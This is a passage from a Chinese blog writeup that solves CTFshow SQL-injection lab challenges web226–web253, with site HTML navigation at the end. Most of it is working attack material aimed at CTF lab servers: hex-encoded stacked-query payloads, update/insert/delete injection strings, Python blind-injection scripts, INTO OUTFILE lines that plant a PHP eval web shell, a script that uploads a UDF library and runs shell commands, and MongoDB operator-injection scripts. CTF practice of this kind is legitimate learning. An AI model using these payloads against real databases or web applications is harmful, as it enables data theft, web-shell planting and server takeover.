die(json_encode($ret)); 11 } 这道题把show给waf掉了\n这题可以用预处理来打\n[SQL注入][强网杯 2019]随便注(三种姿势)-CSDN博客\n格式\nPREPARE name from '[my sql sequece]'; //预定义SQL语句\rEXECUTE name; //执行预定义SQL语句\r(DEALLOCATE || DROP) PREPARE name; //删除预定义SQL语句 我们可以先将要执行的语句转换成16进制后，作为预处理的sql语句传入，并执行\npayload\nusername=1';PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;\r//show tables\rusername=1';PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;\r//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfsh_ow_flagas'\rusername=1';PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;\r//select flagasb from ctfsh_ow_flagas\r//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890} web227 这道题没办法通过查表拿到flag\n这道题的payload是\n1';call getFlag(); 就是执行getFlag函数拿到flag\n但问题是我们要怎么知道这个函数呢\n我们需要查看MySQL的存储过程，如下文\nMySQL——查看存储过程和函数_mysql 查询function-CSDN博客\nSELECT * FROM information_schema.Routines 通过预处理执行\nusername=1';PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines; 可以看到getFlag函数和flag\nweb228 查询语句\r//分页查询\r$sql = \"select id,username,pass from ctfshow_user where username = '{$username}';\";\r$bansql = \"select char from banlist;\";\r返回逻辑\r//师傅说内容太多，就写入数据库保存\rif(count($banlist)\u003e0){\rforeach ($banlist as $char) {\rif(preg_match(\"/\".$char.\"/i\", $username)){\rdie(json_encode($ret));\r}\r}\r} 同web226\nweb229 同web226\nweb230 同web226\nupdate注入 web231 查询语句\r//分页查询\r$sql = \"update ctfshow_user set pass = '{$password}' where username = '{$username}';\";\r返回逻辑\r//无过滤\r知道update函数的作用之后就好理解了\n可以通过update函数更新ctfshow_user表中的内容\n利用update将查询结果写入表中\npassword=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026username=1 查表名\rpassword=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026username=1\r查列名\rpassword=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#\u0026username=1\r得到flag\rpassword=1',username=(select flagas from flaga) where 1=1#\u0026username=1\r原文链接：https://blog.csdn.net/solitudi/article/details/110144623 web232 查询语句\r//分页查询\r$sql = \"update ctfshow_user set pass = md5('{$password}') where username = '{$username}';\";\r返回逻辑\r//无过滤 同web231\npassword=1'),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026username=1\rpassword=1'),username=(select group_concat(column_name) from information_schema.columns where table_name='flagaa') where 1=1#\u0026username=1\rpassword=1'),username=(select flagass from flagaa) where 1=1#\u0026username=1 web233 查询语句\r//分页查询\r$sql = \"update ctfshow_user set pass = '{$password}' where username = '{$username}';\";\r返回逻辑\r//无过滤 这道题貌似waf掉了单引号，导致无法构造闭合，前面的方法用不了\n方法一 wp看到的骚操作\npayload\n#获取表名\rpassword=\\\u0026username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23\r#获取列名\rpassword=\\\u0026username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23\r#获取数据\rpassword=\\\u0026username=,username=(select group_concat(flagass233) from flag233333) 方法二 ：盲注 1\"\"\" 2Author:Y4tacker 3\"\"\" 4import requests 5 6url = \"http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1\u0026limit=10\" 7 8result = \"\" 9i = 0 10 11while 1: 12 i = i + 1 13 head = 32 14 tail = 127 15 16 while head \u003c tail: 17 mid = (head + tail) \u003e\u003e 1 18 # 查数据库 19 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 20 # 查表名 21 # payload = \"select column_name from information_schema.columns where table_name='flag233333' limit 1,1\" 22 # 查数据 23 payload = \"select flagass233 from flag233333\" 24 data = { 25 'username': f\"1' or if(ascii(substr(({payload}),{i},1))\u003e{mid},sleep(0.05),1)#\", 26 'password': '4' 27 } 28 try: 29 r = requests.post(url, data=data, timeout=0.9) 30 tail = mid 31 except Exception as e: 32 head = mid + 1 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web234 查询语句\r//分页查询\r$sql = \"update ctfshow_user set pass = '{$password}' where username = '{$username}';\";\r返回逻辑\r//无过滤 同web233，用\\实现逃逸\nweb235 1查询语句 2 3 //分页查询 4 $sql = \"update ctfshow_user set pass = '{$password}' where username = '{$username}';\"; 5 6返回逻辑 7 8 //过滤 or ' or ‘ 被禁导致information_schema.tables也被禁了\n导致我们没办法查询列\n这种情况涉及到一个知识点 ：CTF|mysql之无列名注入 - 知乎\n在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。\n读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026password=\\ 查字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#\u0026password=\\ web236 1查询语句 2 3 //分页查询 4 $sql = \"update ctfshow_user set pass = '{$password}' where username = '{$username}';\"; 5 6返回逻辑 7 8 //过滤 or ' flag 读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026password=\\\r//banlist,ctfshow_user,flaga 读字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#\u0026password=\\ 这题新增的flag过滤，但是实际上没有影响，或许是过滤返回的内容？\ninsert注入 web237 1查询语句 2 3 //插入数据 4 $sql = \"insert into ctfshow_user(username,pass) value('{$username}','{$password}');\"; 5 6返回逻辑 7 8 //无过滤 insert函数用于插入值\n其实跟update注入差不多\npayload:\n读表名\npassword=1\u0026username=1',(select group_concat(table_name) from information_schema.tables where table_schema=database()));# 查列名\npassword=1\u0026username=1',(select group_concat(column_name) from information_schema.columns where table_name='flag'));#\r//id,flagass23s3,info 爆字段\npassword=1\u0026username=1',(select flagass23s3 from flag));# web238 1查询语句 2 3 //插入数据 4 $sql = \"insert into ctfshow_user(username,pass) value('{$username}','{$password}');\"; 5 6返回逻辑 7 8 //过滤空格 测了一下发现不止是空格，连同一些代替空格的字符也被一同waf了，比如/**/\n我们可以考虑用括号代替空格\npayload\n#获取表名\rusername=1',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23\u0026password=1\r#获取列名\rusername=1',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))%23\u0026password=1\r#获取数据\rusername=1',(select(group_concat(flag))from(flagb)))%23\u0026password=1 web239 查询语句\r//插入数据\r$sql = \"insert into ctfshow_user(username,pass) value('{$username}','{$password}');\";\r返回逻辑\r//过滤空格 or payload:\n读表\nusername=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#\u0026password=1 由于*被ban掉了，没办法用之前无列名爆字段的方法\n这里猜测列名为flag，直接读\nusername=1',(select(flag)from(flagbb)))#\u0026password=1 web240 Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写 查询语句\r//插入数据\r$sql = \"insert into ctfshow_user(username,pass) value('{$username}','{$password}');\";\r返回逻辑\r//过滤空格 or sys mysql 根据hint可以知道是要爆破表名\n拿y4✌的脚本改一下\n\"\"\"\rAuthor:Y4tacker\r\"\"\"\rimport random\rimport requests\rurl = \"http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show\"\rurl_insert = url + \"/api/insert.php\"\rurl_flag = url + \"/api/?page=1\u0026limit=1000\"\r# 看命函数\rdef generate_random_str():\rsttr = 'ab'\rstr_list = [random.choice(sttr) for i in range(5)]\rrandom_str = ''.join(str_list)\rreturn random_str\rwhile 1:\rdata = {\r'username': f\"1',(select(flag)from(flag{generate_random_str()})))#\",\r'password': \"\"\r}\rr = requests.post(url_insert, data=data)\rr2 = requests.get(url_flag)\rif \"ctfshow{\" in r2.text:\rfor i in r2.json()['data']:\rif \"ctfshow{\" in i['pass']:\rprint(i['pass'])\rbreak\rbreak web241 sql语句\r//删除记录\r$sql = \"delete from ctfshow_user where id = {$id}\";\r返回逻辑\r//无过滤 delete注入，delete函数顾名思义就是从数据库中删除内容\n注入点在where后面，可以采用时间盲注或者布尔盲注，但是由于delete会删除数据库中的记录，所以可能会出现记录都删完了但是flag还没注出来的情况\n1import requests 2import time 3url = 'http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php' 4str = '' 5for i in range(1, 60): 6 min,max = 32, 128 7 while True: 8 j = min + (max-min)//2 9 if(min == j): 10 str += chr(j) 11 print(str) 12 break 13 # 爆表名 14 # payload = { 15 # 'id': f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))\u003c{j},sleep(0.03),1)#' 16 # } 17 # 爆列 18 # payload = { 19 # 'id': f\"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{i},1))\u003c{j},sleep(0.03),1)#\" 20 # } 21 # 爆值 22 payload = { 23 'id': f\"if(ascii(substr((select group_concat(flag) from flag),{i},1))\u003c{j},sleep(0.03),1)#\" 24 } 25 start_time = time.time() 26 r = requests.post(url=url, data=payload).text 27 end_time = time.time() 28 sub = end_time - start_time 29 if sub \u003e= 0.2: 30 max = j 31 else: 32 min = j 为什么sleep设定的是0.03，但是超时时间是大于0.2呢\n那是因为要对所有记录都算一遍 if\n那我们怎么测试这个时间呢，这里放一个大佬的脚本\nPractice - CTFSHOW WEB入门 SQL注入篇\nurl = 'http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php'\rdef test2() -\u003e float:\rrand = random.random()\rtime_s = time.time()\r_ = requests.post(url,data={\"id\": f\"if({1 if rand \u003e 0.5 else 0},sleep(0.05),0)\"})\rtime_e = time.time()\rreturn (rand \u003e 0.5, time_e - time_s)\rprint([test() for _ in range(30)]) 我测出来的结果\n[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)] 在false和true之间选取一个合适的值即可，目的是能够进行区分，我这里选取了0.2\n文件注入 web242 1sql语句 2 3 //备份表 4 $sql = \"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';\"; 5 6返回逻辑 7 8 //无过滤 outfile的语法\rSELECT ... INTO OUTFILE 'file_name'\r[CHARACTER SET charset_name]\r[export_options]\rexport_options:\r[{FIELDS | COLUMNS}\r[TERMINATED BY 'string']//分隔符\r[[OPTIONALLY] ENCLOSED BY 'char']\r[ESCAPED BY 'char']\r]\r[LINES\r[STARTING BY 'string']\r[TERMINATED BY 'string']\r]\r----------------------------------------------------\r“OPTION”参数为可选参数选项，其可能的取值有：\rFIELDS TERMINATED BY '字符串'：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。\rFIELDS ENCLOSED BY '字符'：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。\rFIELDS OPTIONALLY ENCLOSED BY '字符'：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。\rFIELDS ESCAPED BY '字符'：设置转义字符，只能为单个字符。默认值为“\\”。\rLINES STARTING BY '字符串'：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。\rLINES TERMINATED BY '字符串'：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。 漏洞的注入点是由于数据库的导出功能\n根据这个我们可以写入一句话木马\npayload:\nfilename=1.php' LINES STARTING BY '\u003c?php eval($_POST[1]);?\u003e'# web243 1sql语句 2 3 //备份表 4 $sql = \"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';\"; 5 6返回逻辑 7 8 //过滤了php 尝试一下.user.ini文件包含\nfilename=.user.ini' lines starting by 'auto_prepend_file=1.txt\\n'%23\rfilename=1.txt' lines starting by '\u003c?=eval($_POST[1])?\u003e'%23 报错注入 新手小白入门——SQL注入之报错注入_sql注入报错注入-CSDN博客\nweb244 sql语句\r//备份表\r$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\";\r返回逻辑\r//无过滤 updatexml报错注入\npayload\n/api/?id=' or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23\r/api/?id=' or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23\r/api/?id=' or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = 'ctfshow_flag' limit 1, 1), 0x7e), 1)%23\r/api/?id=' or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = 'ctfshow_flag' limit 1, 1), 0x7e), 1)%23\r/api/?id=' or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23\r#ctfshow{89982b11-5c7d-4215-a78\r/api/?id=' or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23\r#9-a9f8ecc8f1b1}\r# 数据长度有限制，可以使用substr来截取\r//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1} web245 1sql语句 2 3 4 $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\"; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue报错注入\npayload\n查数据库名：id=' and (select extractvalue(1,concat(0x7e,(select database()))))%23\r爆表名：id=' and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23\r//ctfshow_flagsa\r爆字段名：id=' and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"ctfshow_flagsa\"))))%23\r//flag1\r爆数据：\rid=' and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23\rid=' and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23\r//ctfshow{41446106-c47e-434d-a0c0-16ee43375249} web246 1sql语句 2 3 4 $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\"; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor报错注入\n原理：SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客\n#获取表名\r1' union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#获取列名\r1' union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name='ctfshow_flags' limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#获取数据\r1' union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 web247 1sql语句 2 3 4 $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\"; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor 这道题floor函数也被ban掉了\n根据floor报错注入的原理，其实我们可以知道，之所以会出现错误主要是因为用floor对rand(0)*2进行取整，目的输出011011…的结果，而既然这样我们只需要找一个同样能进行取整的函数来代替floor就ok了\n除了floor之外，我们还能使用round，ceil等\npayload\n查表 1' union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\r查列 1' union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name='ctfshow_flagsa' limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\r查数据 1' union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 web248 1sql语句 2 3 4 $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\"; 5 6返回逻辑 7 8 //无过滤, UDF注入\nctfshow-web入门-sql注入-web248-UDF 注入_ctfshow web248-CSDN博客\n我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：\nMySQL \u003c 5.0\t导出路径随意； 5.0 \u003c= MySQL\u003c 5.1\t需要导出至目标服务器的系统目录（如：c:/windows/system32/） 5.1 \u003c MySQL\t必须导出到MySQL安装目录下的lib\\plugin文件夹下\n堆叠注入查版本\n/api/?id=0';select version();%23 大于5.1，接着要查目录路径\n/api/?id=0';select @@plugin_dir;%23 /usr/lib/mariadb/plugin 拿到路径，我们接下来就可以传入我们的恶意so文件了\nsqlmap中有已经写好的 udf 文件\n如，lib_mysqludf_sys_64.so\n但是由于get传参有长度限制，我们需要进行分段传参\n放一个国外大佬的脚本，将udf文件分段上传后再进行合并即可\nimport requests\rurl=\"http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/\"\rudf=\"\"\rudfs=[]\rfor i in range(0,len(udf),5000):\rudfs.append(udf[i:i+5000])\r#写入多个文件中\rfor i in udfs:\rurl1=url+f\"?id=1';SELECT '{i}' into dumpfile '/tmp/\"+str(udfs.index(i))+\".txt'%23\"\rrequests.get(url1)\r#合并文件生成so文件\rurl2=url+\"?id=1';SELECT unhex(concat(load_file('/tmp/0.txt'),load_file('/tmp/1.txt'),load_file('/tmp/2.txt'),load_file('/tmp/3.txt'))) into dumpfile '/usr/lib/mariadb/plugin/hack.so'%23\"\rrequests.get(url2)\r#创建自定义函数并执行恶意命令\rrequests.get(url+\"?id=1';create function sys_eval returns string soname 'hack.so'%23\")\rr=requests.get(url+\"?id=1';select sys_eval('cat /f*')%23\")\rprint(r.text) web249 1sql语句 2 3 //无 4 $user = $memcache-\u003eget($id); 5 6返回逻辑 7 8 //无过滤 payload:\n?id[]=flag web250 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u003eexecuteQuery('ctfshow.ctfshow_user', $query)-\u003etoArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u003e0){ 10 $ret['msg']='登陆成功'; 11 array_push($ret['data'], $flag); 12 } ctfshow-web入门-sql注入（web249-web253）nosql 注入_ctfshow web250-CSDN博客\n在这些操作符中，$ne 就是我们在重言式注入中需要利用到的那个，它的作用是将不等于指定值的数据都查询出来，比如 $ne=1 时就是将所有不等于 1 的数据都查询出来。\n所以payload就是\nusername[$ne]=1\u0026password[$ne]=1 环境好像有点问题（？）前两次一直查不出来\nweb251 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u003eexecuteQuery('ctfshow.ctfshow_user', $query)-\u003etoArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u003e0){ 10 $ret['msg']='登陆成功'; 11 array_push($ret['data'], $flag); 12 } 同样是\nusername[$ne]=1\u0026password[$ne]=1 继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag\n可能flag在其他用户的密码里，我们禁用admin\nusername[$ne]=admin\u0026password[$ne]=1 拿到flag\nweb252 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u003eexecuteQuery('ctfshow.ctfshow_user', $query)-\u003etoArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u003e0){ 10 $ret['msg']='登陆成功'; 11 array_push($ret['data'], $flag); 12 } 13 这题有很多不同的username\n我们可以考虑采用正则匹配来筛选\nusername[$ne]=1\u0026password[$regex]=ctfshow{ or\n用$gt （大于）一直尝试知道拿到有flag的用户\nusername[$ne]=admin\u0026password[$ne]=1\rusername[$gt]=admin1\u0026password[$ne]=1\rusername[$gt]=admin2\u0026password[$ne]=1\rusername[$gt]=admin3\u0026password[$ne]=1 or\n正则匹配去掉所有为admin开头的用户\nusername[$regex]=^[^admin].*$\u0026password[$ne]=1 web253 1sql语句 2 3 //sql 4 db.ctfshow_user.find({username:'$username',password:'$password'}).pretty() 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u003e0){ 10 $ret['msg']='登陆成功'; 11 array_push($ret['data'], $flag); 12 } 方法一 CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园\n猜测到id为flag，直接布尔盲注拿到flag\nimport string\rimport requests\rurl = \"http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/\"\rletters = \"{}-_\" + string.ascii_lowercase + string.digits\rdef valid_pass(password: str) -\u003e bool:\rdata = {\r\"username[$regex]\": \"flag\",\r\"password[$regex]\": f\"{password}.*\"\r}\rresponse = requests.post(url, data=data)\rreturn \"登陆成功\" in response.json()[\"msg\"]\rresult = \"\"\rwhile True:\rfor letter in letters:\rif valid_pass(result + letter):\rresult += letter\rprint(f\"[*] result: {result}\")\rbreak 方法二 import requests, time, json\rdef brute(action, username=\"\"):\rurl = \"http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/\"\rif action == \"username\":\rres = \"^[^a]\" # admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户\relse:\rres = \"^ctfshow{\"\rfor j in range(30):\rflag = False\rfor i in range(127):\rreg = res\rif chr(i) not in \"0123456789abcdefghijklmnopqrstuvwxyz-{}:,_\":\rcontinue\rn = chr(i)\rif chr(i) in \"-{}:\":\rn = \"\\\\\"+chr(i)\rprint(chr(i))\rif action == \"username\":\rdata = {\"username[$regex]\": f\"{reg+n}\", \"password[$ne]\": f\"1\"}\relse:\rdata = {\"username[$regex]\": f\"{username}$\", \"password[$regex]\": f\"{reg+n}\"}\rwhile True:\rtry:\rr = requests.post(url, data=data, timeout=7)\rbreak\rexcept TimeoutError:\rtime.sleep(0.1)\rexcept KeyboardInterrupt:\rexit(0)\rtry:\rresp = json.loads(r.text)\rexcept:\rresp = None\rcontinue\rif resp[\"msg\"] == \"\\u767b\\u9646\\u6210\\u529f\":\rres += chr(i)\rflag = True\rbreak\rif not flag:\rbreak\rprint(res)\rreturn res\rif __name__ == '__main__':\rusername = brute(\"username\")\rprint(f\"用户名为: {username}\")\rpassword = brute(\"password\", username)\rprint(f\"用户名: {username}\\n密码: {password}\") ",
  "wordCount" : "17274",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-01-22T00:27:55+08:00",
  "dateModified": "2025-01-22T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CTFSHOW-SQL注入-Writeup
    </h1>
    <div class="post-meta"><span title='2025-01-22 00:27:55 +0800 CST'>2025-01-22</span>&nbsp;·&nbsp;35 分钟&nbsp;·&nbsp;Xrntkk

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e6%97%a0%e8%bf%87%e6%bb%a4%e6%b3%a8%e5%85%a5%e5%af%b9%e8%be%93%e5%87%ba%e5%86%85%e5%ae%b9%e8%bf%9b%e8%a1%8c%e8%bf%87%e6%bb%a4" aria-label="无过滤注入（对输出内容进行过滤）">无过滤注入（对输出内容进行过滤）</a></li>
                <li>
                    <a href="#web171" aria-label="web171">web171</a></li>
                <li>
                    <a href="#web172" aria-label="web172">web172</a></li>
                <li>
                    <a href="#web173" aria-label="web173">web173</a></li>
                <li>
                    <a href="#web174" aria-label="web174">web174</a></li>
                <li>
                    <a href="#web175" aria-label="web175">web175</a></li>
                <li>
                    <a href="#%e8%bf%87%e6%bb%a4%e6%b3%a8%e5%85%a5%e5%af%b9%e4%bc%a0%e5%85%a5%e5%8f%82%e6%95%b0%e8%bf%9b%e8%a1%8c%e8%bf%87%e6%bb%a4" aria-label="过滤注入（对传入参数进行过滤）">过滤注入（对传入参数进行过滤）</a></li>
                <li>
                    <a href="#web176" aria-label="web176">web176</a></li>
                <li>
                    <a href="#web177" aria-label="web177">web177</a></li>
                <li>
                    <a href="#web178" aria-label="web178">web178</a></li>
                <li>
                    <a href="#web179" aria-label="web179">web179</a></li>
                <li>
                    <a href="#web180" aria-label="web180">web180</a></li>
                <li>
                    <a href="#web181" aria-label="web181">web181</a></li>
                <li>
                    <a href="#web182" aria-label="web182">web182</a></li>
                <li>
                    <a href="#web183" aria-label="web183">web183</a></li>
                <li>
                    <a href="#web184" aria-label="web184">web184</a></li>
                <li>
                    <a href="#web185" aria-label="web185">web185</a></li>
                <li>
                    <a href="#web186" aria-label="web186">web186</a></li>
                <li>
                    <a href="#web187" aria-label="web187">web187</a></li>
                <li>
                    <a href="#web188" aria-label="web188">web188</a></li>
                <li>
                    <a href="#web189" aria-label="web189">web189</a></li>
                <li>
                    <a href="#web190" aria-label="web190">web190</a></li>
                <li>
                    <a href="#web191" aria-label="web191">web191</a></li>
                <li>
                    <a href="#web192" aria-label="web192">web192</a></li>
                <li>
                    <a href="#web193" aria-label="web193">web193</a></li>
                <li>
                    <a href="#web194" aria-label="web194">web194</a></li>
                <li>
                    <a href="#web195" aria-label="web195">web195</a></li>
                <li>
                    <a href="#web196" aria-label="web196">web196</a></li>
                <li>
                    <a href="#web197" aria-label="web197">web197</a></li>
                <li>
                    <a href="#web198" aria-label="web198">web198</a></li>
                <li>
                    <a href="#web199" aria-label="web199">web199</a></li>
                <li>
                    <a href="#web200" aria-label="web200">web200</a></li>
                <li>
                    <a href="#web190-web200%e9%80%9a%e8%a7%a3" aria-label="web190-web200通解">web190-web200通解</a></li>
                <li>
                    <a href="#sqlmap%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="sqlmap的使用">sqlmap的使用</a></li>
                <li>
                    <a href="#web201" aria-label="web201">web201</a></li>
                <li>
                    <a href="#web202" aria-label="web202">web202</a></li>
                <li>
                    <a href="#web203" aria-label="web203">web203</a></li>
                <li>
                    <a href="#web204" aria-label="web204">web204</a></li>
                <li>
                    <a href="#web205" aria-label="web205">web205</a></li>
                <li>
                    <a href="#web206" aria-label="web206">web206</a></li>
                <li>
